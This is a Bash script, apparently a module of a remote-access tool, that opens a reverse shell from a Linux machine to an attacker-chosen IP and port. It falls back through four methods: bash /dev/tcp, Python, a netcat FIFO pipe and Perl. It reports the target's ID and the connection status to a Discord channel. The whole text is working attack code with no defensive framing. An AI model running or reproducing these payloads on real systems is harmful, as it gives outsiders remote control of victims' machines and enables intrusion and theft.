#!/bin/bash
# ============================================================
# Reverse Shell for Linux - Modular Remote Payload
# ============================================================
# Requires: $IP and $PT (port)
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Reverse shell failed on $SYSID - Missing IP or PORT"
    exit 1
fi

# Notify
send_discord "🔌 **Reverse Shell Initiated**\nTarget: $SYSID\nConnecting to: $IP:$PT"

# Try multiple methods
# Method 1: Bash
if command -v bash &>/dev/null; then
    bash -i >& /dev/tcp/$IP/$PT 0>&1 &
    exit 0
fi

# Method 2: Python
if command -v python3 &>/dev/null; then
    python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &
    exit 0
fi

# Method 3: Netcat
if command -v nc &>/dev/null; then
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PT > /tmp/f &
    exit 0
fi

# Method 4: Perl
if command -v perl &>/dev/null; then
    perl -e "use Socket;\$i='$IP';\$p=$PT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');};" &
    exit 0
fi

send_discord "❌ No suitable shell method available on $SYSID"

